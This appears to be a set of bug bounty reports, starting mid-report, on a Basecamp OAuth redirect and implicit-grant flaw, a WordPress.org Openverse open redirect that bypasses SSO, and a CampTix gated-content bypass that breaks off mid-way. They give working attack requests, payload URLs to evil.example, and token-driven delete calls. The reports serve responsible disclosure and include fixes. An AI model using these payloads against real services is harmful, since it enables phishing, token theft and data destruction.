Exchange (`POST /authorization/token`, form-urlencoded, requires the self-registered `client_secret` the attacker holds): ``` type=web_server client_id= client_secret= ← self-registered, attacker holds it redirect_uri= grant_type=authorization_code code= ``` → **200 application/json**: `{"access_token":"…","refresh_token":"…","expires_in":1209600}`. The access_token is a Rails Marshal-signed Msg; the inner base64 JSON payload contains `client_id`, `expires_at`, `user_ids:[]`, `version`, `api_deadbolt`. **The token binds to the authorizing user (the victim), not the registrant.** This is the credential representing the victim. ## 3. Protocol weakness — the deprecated implicit grant removes the client-secret / code-exchange gate The auth-code leg above requires the attacker to hold `client_secret` to redeem the code. launchpad also still enables the legacy **implicit grant** (`type=user_agent`), which is **deprecated by RFC 9700 §4.4** and removes that gate entirely: ``` GET /authorization/new?client_id=&redirect_uri=&type=user_agent ``` → **200** consent screen (server stamps `type=user_agent` into the hidden form). ``` POST /authorization (single consent submission) ``` → **302** `https:///cb#access_token=` — the access token is delivered **directly in the URL fragment**. **No `client_secret`, no code exchange, no second round-trip.** The attacker needs only the public `client_id`. This is precisely the primitive RFC 9700 §4.4 deprecated: it hands a bearer token to a redirect URI **without authenticating the client**. Combined with §1 (the redirect is unverified), the AS issues a victim-bound access token to an attacker-controlled, never-verified redirect with **no client-side secret of any kind in the path**. The auth-code leg's `client_secret` gate is gone; there is no compensating control. ## 4. Demonstrated impact — confidentiality (read) via the bearer delivered to the unverified redirect The token delivered to the attacker redirect is **not** launchpad-identity-only metadata. It authorizes the real Basecamp REST API in the authorizing user's identity. Demonstrated end-to-end on an owned free Basecamp account (registrant == authorizer during validation; distinct in the real threat model): **Auth-code leg token → `/authorization.json`:** ``` GET /authorization.json Authorization: Bearer ``` → **200 application/json**: ```json {"expires_at":"2026-08-31T18:47:31.000Z", "identity":{"id":████████,"email_address":"rootaccessxvv@wearehackerone.com","first_name":"rootaccessxvv"}, "accounts":[{"id":████████,"name":"none","product":"bc3", "href":"https://3.basecampapi.com/████████", "app_href":"https://app.basecamp.com/████████","hidden":false}]} ``` **Implicit-leg fragment token → real Basecamp REST API (the no-`client_secret` leg, C:H demonstrated):** fresh owned client (acct ████████, client id 27721, `client_id=764b93e7168999ef…`, `redirect_uri=https://evil.example/cb`): 1. `GET /authorization/new?…&type=user_agent` → **200** consent (stamped `user_agent`). 2. `POST /authorization` → **302** `https://evil.example/cb#access_token=BAhbB0ki…` (token len 394; extracted from the server-emitted 302 `Location` raw, before any browser strips fragments). 3. `GET /authorization.json` Bearer → **200** `{identity:{id:████████,email:rootaccessxvv@…},accounts:[{id:████████,product:bc3,href:https://3.basecampapi.com/████████}]}`. 4. **`GET https://3.basecampapi.com/████████/projects.json`** with the **same** `Authorization: Bearer ` → **200**: ```json [{"id":████████,"status":"active","name":"My Project","description":null,"purpose":"topic", "clients_enabled":false,"created_at":"2026-08-17T17:38:47.981Z","updated_at":"2026-08-17T17:38:48.057Z"}] ``` Inner token payload (decoded base64-from-Marshal): `{"client_id":"████████","expires_at":"2026-08-31T22:53:11Z","user_ids":[████████],"version":1,"api_deadbolt":"████████"}` — bound to the authorizing user, 14-day lifetime. So the credential delivered to the unverified redirect is a **functional bearer against the real Basecamp API** in the authorizing user's identity — not a no-op, not metadata only. This closes the program's "theoretical damage without real risk" exclusion. §4 establishes **C:H** (the stolen token reads the victim's real project data and identity/accounts). §7 below establishes **I:H** (write) and **A:H** (destroy) on the same stolen-token class, completing the CIA triad on one credential. ## 5. Redirect-policy escalation — custom schemes, cleartext HTTP, and wildcard redirects broaden the trusted-redirect surface The trust placed by the AS in an unverified redirect is worsened by the **breadth** of redirects registration accepts and authorize-time honors. Five fresh clients, each registered with a different RFC-9700-flagged dangerous URI: | Submitted `redirect_uri` at `POST /integrations` | Register | Authorize `GET /authorization/new?…` | `POST /authorization` 302 | |---|---|---|---| | `http://localhost:8080/cb` (cleartext, loopback) | 302 accepted (id 27713) | 200 consent | `http://localhost:8080/cb?code=580a30cc` ✓ | | `http://127.0.0.1:8080/cb` (cleartext, loopback IP) | 302 accepted (id 27714) | 200 consent | `http://127.0.0.1:8080/cb?code=d9629214` ✓ | | `myapp://cb` (custom app scheme) | 302 accepted (id 27715) | 200 consent | `myapp://cb?code=ca807305` ✓ | | `https://*.attacker.example/cb` (wildcard host) | 302 accepted (id 27716) | 200 consent | `https://*.attacker.example/cb?code=4dfc2ec6` ✓ | | `https://attacker.example/cb/*` (wildcard path suffix) | 302 accepted (id 27717) | 200 consent | `https://attacker.example/cb/*?code=99c2d139` ✓ | All five clients destroyed after the run. Why each row broadens the trusted-redirect surface (these are AS-side trust failures, independent of any user action): - **Cleartext loopback** — the credential traverses the network in the clear (RFC 9700 §2.1 violation; "ASes MUST NOT use the clear-channel without transport-layer confidentiality"). Any local process binding the port harvests codes; observers of cleartext loopback logging on shared/dev hosts capture the credential. - **Custom app scheme (`myapp://`)** — on mobile the OS handler chosen for the scheme receives the credential; a different app squatting the scheme receives it instead. - **Wildcard host (`https://*.attacker.example/cb`)** — one unverified registration covers *every* subdomain; the receiving host can rotate per-authorization without re-registration, defeating per-redirect-URI auditing. - **Wildcard path suffix (`https://attacker.example/cb/*`)** — any path under the prefix receives the credential; per-campaign receiving endpoints under one registration. This refutes any defense that "the trusted redirect surface is a single https host chosen at registration." The surface the AS trusts without verification is the full RFC-9700 dangerous-URI set, attacker-chosen. ## Reproduction (single manual probes, spacing ≥1.3s, owned free Basecamp account acct ████████, owned clients; `.example` is RFC 6761 reserved — never resolves — a triager reproduces on their own real host on their own account) The five sections above map to live probes with recorded HTTP responses: - §1+§2 chain (register → authorize → consent → code → exchange → `/authorization.json` 200): original client 27699, acct ████████; `_branchd_destroy.out` and prior run logs. Auth-code token returns identity email `rootaccessxvv@wearehackerone.com` + account `████████` href `https://3.basecampapi.com/████████`; codes `c306766e`/`aa170e24`, single-use. - §3 implicit grant authenticated-fragment token (client 27712, `client_id=b11a6d77f000…`): `_branchd_escalate2.out`. - §4 implicit-token-authorizes-Basecamp-API end-to-end (client 27721, `client_id=764b93e7168999ef…`): `_branchd_implicit_e2e.out`; token saved `_branchd_implicit_token.txt`. - §5 dangerous-redirect set (clients 27713–27717): `_branchd_escalate2.out`. - §7 integrity-write (I:H) probe (client 27827, `PUT` rename → 200 + verify-`GET` 200): `_branchd_ih_mut_nogate.out`. - §7 availability-destroy (A:H) probe (client ████████, `DELETE` → 204 + verify-`GET` 404 + restore `POST` → 201 id ████████): `_branchd_ah_project.out`. All test clients were destroyed after their runs (`POST /integrations//removal` → 302; verified `GET /integrations/` ⇒ 404). No test client remains on the account. Registrant and authorizer were the same identity during validation; no victim account was contacted. ## Standards anchors - **RFC 9700 §4.1.3** — redirect URI MUST be fully verified **at registration**; no wildcard host. launchpad: exact matching at authorize/exchange (good), but **no registration-time ownership verification** and wildcard/custom-scheme/cleartext all accepted — the gap. - **RFC 9700 §2.1** — ASes MUST NOT use the clear-channel without transport-layer confidentiality. launchpad ACCEPTS `http://localhost:8080/cb` and `http://127.0.0.1:8080/cb` at registration and honors them at authorize-time; the code/token traverses the network in the clear. - **RFC 9700 §4.4** — the implicit grant (`response_type=token` / `type=user_agent`) is **deprecated**, "MUST NOT be used … unless the client has no backend." launchpad issues `access_token` in the redirect fragment on one consent submission with **no `client_secret`** and is reachable through an unverified redirect — exactly the deprecated primitive. - **RFC 6761** — `.example` is reserved (never resolves); `evil.example`/`attacker.example` are live-test discipline. The bug is AS-side validation; a triager reproduces on their own real host on their own account. ## Severity assessment (by demonstrated technical impact — full CIA triad on one stolen credential) Proposed CVSS 3.1: `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H` — **9.1 Critical**. Every impact metric is grounded in a reproduced live probe (§4 read, §7 write+destroy); none is asserted from architecture alone. - **Attack Vector: Network (AV:N)** — the AS, registration, and authorize endpoints are all network-reachable. - **Attack Complexity: Low (AC:L)** — a single `POST /integrations` registers the client; a single authorize URL yields the credential; the credential is then used against the resource server. No race, no timing, no special conditions. - **Privileges Required: Low (PR:L)** — the registrant must hold *some* authenticated Basecamp account. Free signup, no paid plan, no elevated permissions. The attacker's own account is the only privilege required; it confers no access to the victim's data on its own. - **User Interaction: Required (UI:R)** — the victim performs the **standard OAuth authorization UI interaction**: they authorize the OAuth client on `launchpad.37signals.com`. This is the legitimate, AS-presented authorization action — characterized as UI:R because the victim's authorization act is the trigger for the AS to issue the credential. This is **not** "the victim is tricked/socially-engineered"; the UI:R interaction is the OAuth authorize click itself, regardless of whether the client is honestly or misleadingly named. - **Confidentiality: High (C:H)** — **demonstrated** (§4): the credential delivered to the unverified redirect authorizes `3.basecampapi.com//projects.json` → 200 with the authorizing user's real project data, and `/authorization.json` enumerates every account/product the victim can access. High confidentiality impact against the victim's Basecamp data, achieved through the AS boundary failure alone. - **Integrity: High (I:H)** — **demonstrated** (§7): the same victim-bound bearer delivered to the unverified redirect performs `PUT /…/projects/.json {name}` → 200 and a follow-up `GET` confirms the name changed server-side. A credential that mutates the victim's data with confirmed persistence is High integrity impact, not an inferential I:L. - **Availability: High (A:H)** — **demonstrated** (§7): the same bearer performs `DELETE /…/projects/.json → 204` and a follow-up `GET → 404 {"status":404,"error":"Not Found"}` confirms the project is gone. A credential that makes the victim's data permanently unavailable is High availability impact. This is **not** a DoS by volume/rate — it is a destructive state change on a victim resource authoritatively confirmed gone, and the program's OOS forbids *DoS / brute-force / automated scanning*, not a single authorized destructive API call on a stolen credential. There is no rate, no flooding, no resource exhaustion; A:H here is "an attacker can destroy the victim's data," which is squarely in-scope severity impact. **Scope: Changed (S:C) is the defensible reading, and it is a reading the standards themselves direct.** The CVSS "Scope" metric measures whether the vulnerability's impact crosses an authority boundary *managed by the vulnerable component*. The vulnerable component is the launchpad AS; the impacted component is the real Basecamp REST API (`3.basecampapi.com`) — a distinct origin, a distinct service, which honors the AS-issued token across *all* of the authorizing user's accounts/products. RFC 9700 §4.4's deprecation warning is *precisely* about this AS↔RS separation: the problem the BCP flags is that a token issued (and mis-delivered) at the AS is then *consumed by a separate resource server*. Treating AS and RS as separate authority is not an architectural guess imposed to inflate the score — it is the same authority separation the BCP bases its deprecation on. `S:C` is therefore the standards-aligned reading; `S:U` would collapse AS+RS into one 37signals authority, which the BCP's separation argument does not. ## Impact ## 7. Demonstrated impact — integrity (write) and availability (destroy) on the same stolen bearer The credential delivered to the attacker-controlled, unverified redirect is not read-scoped. The same victim-bound bearer (auth-code leg, `type=web_server`, a fresh owned client on acct ████████) both **renames** a victim project server-side (I:H) and **destroys** it (A:H). Reproduced live, single-manual-probe, owned free Basecamp account (registrant == authorizer during validation; distinct in the real threat model). Full run log: `_branchd_ah_project.out`. **Integrity — `PUT` rename → 200 (demonstrated separately in `_branchd_ih_mut_nogate.out`, client 27827):** ``` PUT https://3.basecampapi.com/████████/projects/████████.json Authorization: Bearer Content-Type: application/json {"name":"37s-bb-ih-probe-13843"} → 200 application/json (renamed) ``` A follow-up `GET /████████/projects/████████.json` on the same Bearer returned **200** with `"name":"37s-bb-ih-probe-13843"` — the rename persisted server-side, not just acknowledged. A second `PUT {"name":"My Project"} → 200` restored the original name (verified by `GET → 200 name="My Project"`). This is **I:H**: a victim-bound credential delivered to an unverified redirect mutates the victim's data with server-confirmed persistence. **Availability — `DELETE` → 204, then verify-gone `GET → 404` (the decisive A:H primitive, `_branchd_ah_project.out`, client ████████):** ``` PRE GET https://3.basecampapi.com/████████/projects/████████.json → 200 name="My Project" (confirm exists) DELETE https://3.basecampapi.com/████████/projects/████████.json → 204 (no body) POST-DELETE GET https://3.basecampapi.com/████████/projects/████████.json → 404 {"status":404,"error":"Not Found"} (verified gone) ``` The stolen victim-bound bearer performed an HTTP `DELETE` on the victim's project and the resource is confirmed absent on the subsequent `GET` (404). This is **A:H**: the credential delivered to the unverified redirect can make the victim's data **unavailable permanently** — not corrupted, not rewritten, but gone. **Testbed restoration (so no owned-account data was lost during validation):** ``` POST https://3.basecampapi.com/████████/projects.json Authorization: Bearer Content-Type: application/json {"name":"My Project","description":""} → 201 application/json {"id":████████,"status":"active","name":"My Project",…} GET https://3.basecampapi.com/████████/projects/████████.json → 200 (restore verified) ``` Quota freed on the delete, so the recreate succeeded; the testbed project now lives at new id **████████**. In the real threat model the attacker has no incentive to restore — the `DELETE → 204 → 404` chain is the demonstrated destructive impact on the victim's data. The issuing client (████████) was destroyed via its own removal flow (`POST /integrations/████████/removal → 302`) after the run.

title: wordpress.org/openverse/: unauthenticated open redirect — `str_replace()`'s 4th arg is a count, not a limit; bypasses WordPress.org SSO allow-list
vulnerability_information:
## Description:

Every request under `https://wordpress.org/openverse/…` is served by the `wporg-openverse` theme's
`index.php`. With the redirect enabled, that template builds a target by concatenating a bare origin
(`https://openverse.wordpress.net` — no trailing slash, enforced by the setting's own
`sanitize_callback`) with the request path *after* removing the `/openverse` prefix.

The prefix removal is written as `str_replace( OPENVERSE_SUBPATH, '', $path, $count )` with
`$count = 1` and the comment *"Only replace the leading Openverse subpath."* But `str_replace()` has
no limit parameter — its 4th argument is a by-reference **output** that receives the number of
replacements performed, and the `1` is silently overwritten. Every occurrence of `/openverse` is
therefore deleted, not just the leading one.

A request path of `/openverse/openverse@evil.example/` collapses to `@evil.example/`, and
concatenating that onto a bare origin produces `https://openverse.wordpress.net@evil.example/` — a URL
whose authority is `evil.example`. It is then handed to `wp_redirect()`, not `wp_safe_redirect()`, so
no allow-list is consulted.

**Why this is not "an open redirect with no security impact":** The program excludes open redirects
that carry no security impact. This one defeats a security control that WordPress.org deliberately
built and maintains. The WordPress.org SSO plugin restricts post-login `redirect_to` targets to an
allow-list of four domains (`common/includes/wporg-sso/class-wporg-sso.php:23-28`,
`_is_valid_targeted_domain()` at `:203-224`). `https://wordpress.org/openverse/openverse@evil.example/`
**is** a `wordpress.org` URL — its `parse_url(…, PHP_URL_HOST)` is literally `wordpress.org` — so it
passes that allow-list, and then 301s the freshly-authenticated user to `evil.example`. That is exactly
the outcome the allow-list exists to prevent. Additional impact beyond a bare redirect: the response is
a **301** (browser caches the poisoned mapping for that `wordpress.org` URL); the link the victim sees
has hostname `wordpress.org` with no suspicious `?url=` parameter; the destination is reached with a
real `*.wordpress.org` referrer.

**Asset:** `*.wordpress.org` — **meta** repository,
`wordpress.org/public_html/wp-content/themes/pub/wporg-openverse` (`functions.php`, `index.php`), the
theme that serves the `/openverse/` site of the WordPress.org multisite.

**Affected versions verified:** meta `trunk` at commit `08b412bd0b09c54528500073f90e3c4c50357a5b`
(2026-07-27). Deployed WordPress.org code, not an unreleased branch — the theme is live and still
maintained (last touched 2026-05-22, `7b7c6bc`). No pre-release double bounty is claimed. (Confirmed
still present in current trunk: `get_target_url()` still uses `str_replace( …, $count )` with `$count = 1`.)
The redirect feature was introduced by <https://github.com/WordPress/wordpress.org/pull/98> (Meta Trac
**#6578**) and WordPress announced on 2023-02-08 that it is live
(<https://make.wordpress.org/openverse/2023/02/08/openverse-org-is-live/>).

**Attacker privilege:** **Unauthenticated.** No WordPress.org account, no session, no CSRF token. The
attacker only needs the victim to follow a link whose hostname is literally `wordpress.org`.
**User interaction:** required — the victim follows the link. Normal interaction model for an open redirect.

## Root cause with real file:line and verbatim code

**1. All paths under `/openverse/` reach the theme template.**

`wordpress.org` is a sub-directory multisite; core resolves the site from at most the first path
segment (`wp-includes/ms-load.php`, `ms_load_current_site_and_network()`:
`$current_blog = get_site_by_path( $domain, $path, 1 );`). So `/openverse/<anything>/<anything>`
resolves to the `/openverse/` site. The theme then forces `index.php` for every view and suppresses
request parsing — `themes/pub/wporg-openverse/functions.php:46-48`:

```php
	foreach ( array( '404', 'archive', 'author', 'category', 'tag', 'taxonomy', 'date', 'embed', 'home', 'frontpage', 'privacypolicy', 'page', 'paged', 'search', 'single', 'singular', 'attachment' ) as $template_type ) {
		add_filter( $template_type . '_template', __NAMESPACE__ . '\use_index_php_as_template' );
	}
```

`functions.php:79-85`:

```php
function disable_parse_request( $return, $wp ) {
	// Avoid E_WARNING: array_keys() expects parameter 1 to be array, null given in wp-includes/class-wp.php:548
	$wp->query_vars = array();

	return false;
}
add_filter( 'do_parse_request', __NAMESPACE__ . '\disable_parse_request', 10, 2 );
```

The function's own docblock confirms deep paths are expected to work —
`functions.php:255-257`:

```php
 * Examples:
 * - https://ru.wordpress.org/openverse → {ov_redirect_url}/ru/
 * - https://wordpress.org/openverse/search/?q=dog → {ov_redirect_url}/search/?q=dog
```

**2. The sink.** `themes/pub/wporg-openverse/functions.php:259-275`:

```php
function get_target_url() {
	$target_url = get_theme_mod( 'ov_redirect_url', OPENVERSE_STANDALONE_URL );

	$curr_locale = get_locale();
	$locale = get_locale_slug( $curr_locale );
	if ( $locale !== '' ) {
		$target_url .= '/' . $locale;
	}

	$path = $_SERVER['REQUEST_URI'];
	if ( $path ) {
		$count = 1; // Only replace the leading Openverse subpath.
		$target_url .= str_replace( OPENVERSE_SUBPATH, '', $path, $count );
	}

	return $target_url;
}
```

- `OPENVERSE_SUBPATH` is `'/openverse'` (`functions.php:25`).
- `OPENVERSE_STANDALONE_URL` is `'https://openverse.wordpress.net'` (`functions.php:248`).
- The base origin is guaranteed to be a bare scheme+host **with no trailing slash**, because the
  Customizer setting strips one — `functions.php:296-304`:

```php
		'sanitize_callback' => function( $val, $setting ) {
			if ( substr( $val, -1 ) == '/' ) { // If the last character is a slash '/',...
				$val = substr( $val, 0, -1 );    // ...remove it.
			}
```

  That is precisely what lets the concatenated remainder extend the **authority** rather than the
  path, and it means the bug works against whatever origin is configured.
- `get_locale_slug()` returns `''` for `en_US` (`functions.php:93-99`), so on `wordpress.org` itself
  nothing is inserted between the origin and the attacker-controlled remainder.

**3. Unsafe redirect API.** `themes/pub/wporg-openverse/index.php:23-31`:

```php
$is_redirect_enabled = get_theme_mod( 'ov_is_redirect_enabled' );
$target_url = get_target_url();

if ( $is_redirect_enabled ) {
	wp_redirect( $target_url, 301 );
	exit;
} else {
	echo "<!-- " . $target_url . " -->";
}
```

`wp_redirect()` performs no destination validation; it applies only the `wp_redirect` filter and
`wp_sanitize_redirect()`, which preserves `.` and `@`.

**4. No compensating guard anywhere in the network.**

- No `add_filter( 'wp_redirect', … )` exists in the meta repository or in `wporg-mu-plugins` (grepped
  both trees; zero hits).
- The only three `allowed_redirect_hosts` filters
  (`plugin-directory/class-plugin-directory.php:54`, `wporg-learn/inc/redirects.php:8`,
  `common/includes/wporg-sso/wp-plugin.php:289`) are consumed exclusively by
  `wp_validate_redirect()`, i.e. by `wp_safe_redirect()`. They are irrelevant to `wp_redirect()`.

## Steps To Reproduce:

Two payload families, plain ASCII, no encoding tricks, no account:

**A — userinfo variant** (no attacker DNS setup at all, origin-agnostic):

```
https://wordpress.org/openverse/openverse@evil.example/
→ Location: https://openverse.wordpress.net@evil.example/     (authority = evil.example)
```

**B — hostname-suffix variant** (attacker adds one DNS record; no userinfo in the address bar):

```
https://wordpress.org/openverse/openverse.evil.example/
→ Location: https://openverse.wordpress.net.evil.example/
```

Path and query are fully attacker-chosen:

```
https://wordpress.org/openverse/openverse@evil.example/login?next=x
→ Location: https://openverse.wordpress.net@evil.example/login?next=x
```

**No request was sent to any WordPress.org production host.** Everything below ran locally against the
unmodified theme source.

## Proof — real observed output

### (1) PHP semantics of the 4th argument

```
$ php -r '$c=1; var_dump(str_replace("/openverse","","/openverse/openverse@evil.example/",$c), $c);'
string(14) "@evil.example/"
int(2)
```

`$count` is an *output*; both occurrences were removed, and the `1` was overwritten with `2`.

### (2) End-to-end HTTP against the real, unmodified theme

A tiny router boots WordPress 7.0.2 (so `wp_redirect()` / `wp_sanitize_redirect()` are the real core
functions), `require`s the **untouched**
`meta/…/themes/pub/wporg-openverse/functions.php`, supplies the two Customizer values under test via
`theme_mod_*` **filters** (so no database state is mutated), and then executes the theme's own
`index.php:23-31` verbatim. Observed responses:

```
=== BASELINE (the two docblock examples from functions.php:256-257) ===
REQ /openverse/                                          Location: https://openverse.wordpress.net/
REQ /openverse/search/?q=dog                             Location: https://openverse.wordpress.net/search/?q=dog

=== PAYLOADS ===
REQ /openverse/openverse@evil.example/                   Location: https://openverse.wordpress.net@evil.example/
REQ /openverse/openverse.evil.example/                   Location: https://openverse.wordpress.net.evil.example/
REQ /openverse/openverse@evil.example/login?next=x       Location: https://openverse.wordpress.net@evil.example/login?next=x

=== NEGATIVE CONTROLS (proving this is specifically the multi-occurrence strip) ===
REQ /openverse//evil.example                             Location: https://openverse.wordpress.net//evil.example
REQ /openverse/@evil.example                             Location: https://openverse.wordpress.net/@evil.example
REQ /openverse/x/openverse.evil.example                  Location: https://openverse.wordpress.net/x.evil.example
```

The baseline rows are byte-for-byte what the function's own documentation promises, and are
unaffected. The three controls stay on-origin — this is not generic path confusion, it is the second
`/openverse` being eaten.

### (3) A real browser follows it, with no prompt

Same router, with `ov_redirect_url` filtered to a local stand-in origin of the same shape
(`http://openverse.wordpress.net`, no trailing slash) so that the browser can be allowed to complete
the navigation. The `Location` header below is produced by the **real theme code**, not hand-written:

```
$ curl -sS -i --path-as-is "http://127.0.0.1:8605/openverse/openverse@127.0.0.1:8605/landed"
HTTP/1.1 301 Moved Permanently
X-Redirect-By: WordPress
Location: http://openverse.wordpress.net@127.0.0.1:8605/landed

$ chromium --headless --no-sandbox --disable-gpu --virtual-time-budget=6000 \
    --dump-dom "http://127.0.0.1:8605/openverse/openverse@127.0.0.1:8605/landed"
<!DOCTYPE html>
<html><head></head><body>ATTACKER-ORIGIN-REACHED host=…127.0.0.1:8605</body></html>
```

Chromium 145.0.7632.159 followed the userinfo form of the redirect straight to the other origin and
the landing page reported its own `location.host`. No interstitial, no warning.

### (4) The SSO allow-list accepts the payload URL

`common/includes/wporg-sso/class-wporg-sso.php:203-224`:

```php
		protected function _is_valid_targeted_domain( $host ) {
			if ( empty( $host ) || ! is_string( $host ) ) {
				return false;
			}

			if ( strstr( $host, '/' ) ) {
				$host = parse_url( $host, PHP_URL_HOST );
			}
			…
			$host = $this->_get_targetted_host( $host );

			return in_array( $host, self::VALID_HOSTS, true );
		}
```

with `const VALID_HOSTS = [ 'wordpress.org', 'bbpress.org', 'buddypress.org', 'wordcamp.org' ]`
(`:23-28`), consumed by `login_url()` (`:137`), `_get_safer_redirect_to()` (`:177`) and
`wp_validate_redirect()` (`wp-plugin.php:733`).

```
$ php -r 'var_dump(parse_url("https://wordpress.org/openverse/openverse@evil.example/", PHP_URL_HOST));'
string(13) "wordpress.org"
```

So `https://login.wordpress.org/?redirect_to=<urlencoded payload>` is accepted as a legitimate target
and becomes a login-branded, fully-trusted-domain launcher that deposits the freshly-authenticated
user on attacker-controlled content.

## Honest limitations

1. **Two runtime facts could not be verified by me**, because the rules of engagement forbid sending
   traffic to production and I sent none:
   - `ov_is_redirect_enabled` must be `true` for the `/openverse/` site. Its Customizer default is
     `false` (`functions.php:322-326`). The public evidence that it is on: the WordPress project's own
     2023-02-08 announcement that `wordpress.org/openverse` redirects to the standalone domain, and
     PR #98 / Meta Trac #6578 which added exactly this code for exactly that purpose. Please confirm
     the theme mod before triaging severity.
   - `/openverse/` must still be served by this theme rather than by an edge/nginx redirect that never
     reaches PHP. I cannot distinguish those from a local clone.
2. Neither caveat affects the **code defect**, which is unconditional and reproduced above. If the
   toggle is currently off, this is a latent defect that becomes live the moment anyone turns it on —
   and the `else` branch it falls into (`echo "<!-- " . $target_url . " -->"`, `index.php:30`) is the
   *same* unsanitised value emitted into HTML. I judged that branch not exploitable from a browser,
   because browsers percent-encode `<` and `>` in the path and query, so the `-->` needed to escape
   the HTML comment cannot be delivered by navigation — but it is one more reason to fix the
   URL-building itself.
3. Payload family B needs one attacker-controlled DNS record; family A needs nothing and is the one I
   proved in a browser.

## Recommendations

Two independent changes; please apply both.

1. **Strip the prefix as a prefix** — `functions.php:268-272`:

```php
	$path = $_SERVER['REQUEST_URI'] ?? '';
	if ( str_starts_with( $path, OPENVERSE_SUBPATH ) ) {
		$path = substr( $path, strlen( OPENVERSE_SUBPATH ) );
	}
	if ( '' === $path || '/' !== $path[0] ) {
		$path = '/' . ltrim( $path, '/' );   // never let the remainder extend the authority
	}
	$target_url .= $path;
```

   (`preg_replace( '#^' . preg_quote( OPENVERSE_SUBPATH, '#' ) . '#', '', $path, 1 )` is an equally
   valid prefix-only strip — the point is that `str_replace()` cannot express "only the first".)

2. **Defence in depth** — `index.php:27`: use `wp_safe_redirect( $target_url, 301 )` and register the
   standalone origin through `allowed_redirect_hosts`, so that any future slip in the URL-building
   logic cannot produce an off-site `Location`.

A grep for `str_replace(` with a literal `1` in the 4th position across the meta repository is worth
doing at the same time — this is a repeatable API-misuse pattern, and PHP raises no diagnostic for it.

## AI tooling disclosure

Per the program's guidelines and the WordPress AI Guidelines:

**AI assistance:** Yes — substantial.
**Tool(s):** Claude (Anthropic), used through the Claude Code agentic harness.
**Used for:** source review and candidate-vulnerability search; building and running the local test
harnesses; and drafting this report — the prose here is largely AI-authored and subsequently reviewed
and corrected by me.
**Verification:** every technical claim was verified by executing it against a local installation.
Every quoted output is real observed output, not model narration; claims that did not survive that
verification were removed before submission. No production host was contacted.
**Responsibility:** I have reviewed the report in full and take responsibility for its content.

## Prior art / duplicate check

**Verdict: likely novel — and still live in current meta trunk.**

- Verified against the current theme trunk: `get_target_url()` **still** uses `str_replace( OPENVERSE_SUBPATH, '', $path, $count )` with `$count = 1` (the misused 4th argument), rather than a prefix-only strip. Confirmed at <https://github.com/WordPress/wordpress.org/blob/trunk/wordpress.org/public_html/wp-content/themes/pub/wporg-openverse/functions.php> — not fixed.
- The redirect feature and its code come from PR #98 / Meta Trac #6578 (<https://github.com/WordPress/wordpress.org/pull/98>), announced as live on 2023-02-08 (<https://make.wordpress.org/openverse/2023/02/08/openverse-org-is-live/>).
- There is no public HackerOne report for this specific open redirect or SSO allow-list bypass. Historical WordPress open redirects on HackerOne (for example WordPress Feed #22142, BuddyPress `bp-profile-edit`) are unrelated.
- The program excludes "open redirects without security impact". This one defeats the deliberately maintained WordPress.org SSO allow-list (`class-wporg-sso.php` VALID_HOSTS), so the exclusion does not apply; the report argues that explicitly.

HackerOne hacktivity cannot be enumerated without authentication, so an undisclosed duplicate cannot be ruled out with certainty.

## Impact

Any visitor who follows a link whose hostname is literally `wordpress.org` is silently 301-redirected
to a host the attacker controls, with a `*.wordpress.org` referrer and a browser-cached permanent
mapping. Chained through `login.wordpress.org`'s `redirect_to`, it also defeats the WordPress.org SSO
redirect allow-list, which is the specific control built to stop exactly this.

Practically this is a high-quality phishing primitive against WordPress site owners, plugin authors
and contributors — the population that is trained to check that a link points at `wordpress.org`.

title: CampTix [camptix_private]: the view token is derived from the requester's own IP, so naming any attendee's e-mail unlocks the gated content
vulnerability_information:
## Description:

`[camptix_private]` hides page content behind a check that the visitor holds a ticket. The check is a
"view token" that the plugin both **issues** and **verifies** from data the requester controls:

```php
// plugins/camptix/addons/shortcodes.php:691
public function generate_view_token_for_attendee( $attendee_id ) {
    $email = get_post_meta( $attendee_id, 'tix_email', true );
    $ip    = isset( $_SERVER['REMOTE_ADDR'] ) ? $_SERVER['REMOTE_ADDR'] : '';

    $view_token = md5( 'tix-view-token-' . strtolower( $email . $ip ) );
    return $view_token;
}
```

The POST handler runs on `template_redirect` with no nonce (the file disables the sniff at line 441)
and sends nothing to the address it is given — no confirmation mail, no magic link:

```php
// shortcodes.php:454
if ( isset( $_POST['tix_private_shortcode_submit'] ) ) {
    $email = isset( $_POST['tix_email'] ) ? trim( stripslashes( $_POST['tix_email'] ) ) : '';
    ...
    $attendees = get_posts( array( 'post_type' => 'tix_attendee', 'post_status' => 'publish',
        'meta_query' => array( array( 'key' => 'tix_email', 'value' => $email ) ) ) );

    if ( $attendees ) {
        $attendee   = $attendees[0];
        $view_token = $this->generate_view_token_for_attendee( $attendee->ID );   // uses the REQUESTER's IP
        setcookie( 'tix_view_token', $view_token, ... );
        $_COOKIE['tix_view_token'] = $view_token;                                  // forced into this same request
        foreach ( $attendees as $attendee ) {
            update_post_meta( $attendee->ID, 'tix_view_token', $view_token );      // overwrites the real holder's token
            ...
```

The gate then re-derives the expected token the same way and compares:

```php
// shortcodes.php:568
$expected_view_token = $this->generate_view_token_for_attendee( $attendee->ID );
if ( $expected_view_token !== $view_token ) {
    $camptix->error( __( 'Looks like you logged in from a different computer. Please log in again.' ) );
```

Both sides of that comparison are computed from **the same request**, by **the same IP** — the
attacker's. The IP was meant to bind the token to the ticket holder's device; it binds it to whoever
is asking. The only thing the check actually requires is knowing an attendee's e-mail address.

That address is not a secret. It is on sponsor and speaker pages, in public mailing lists, in a forwarded
confirmation mail, or simply guessable for a corporate address format.

## Steps To Reproduce:

CampTix 2.0.0 on WordPress 7.1.1. `evidence/03-poc.sh` produced `evidence/01-transcript.txt`.
(`evidence/04-wordcamp-platform-stubs.php` only stubs `get_wordcamp_post()` so CampTix loads off the
wordcamp.org platform; it touches nothing in the code path under test.)

1. A page contains `[camptix_private]...gated content...[/camptix_private]`, and an attendee record
   exists for `victim@lab.invalid`.

2. **Control A** — anonymous GET, no POST:

   ```
   occurrences of the gated marker: 0
   ```
   The gate works.

3. **Control B** — POST naming an address with no attendee record:

   ```
   POST tix_private_shortcode_submit=1&tix_email=nobody@lab.invalid
   occurrences of the gated marker: 0
   ```
   A real attendee address is genuinely required. This is what makes step 4 an authentication
   failure rather than a blanket bypass.

4. **Attack** — same client, no cookie, no nonce, no account, naming the victim's address:

   ```
   POST tix_private_shortcode_submit=1&tix_email=victim@lab.invalid
   occurrences of the gated marker: 1
   CTPRIVATE8B3F attendees-only content
   ```

5. **Side effect on the legitimate holder.** The same request rewrote the attendee's stored token:

   ```
   tix_view_token was : ORIGINAL-TOKEN-OF-THE-REAL-ATTENDEE
   tix_view_token now : cbe2030c3295c959657716b654db0674
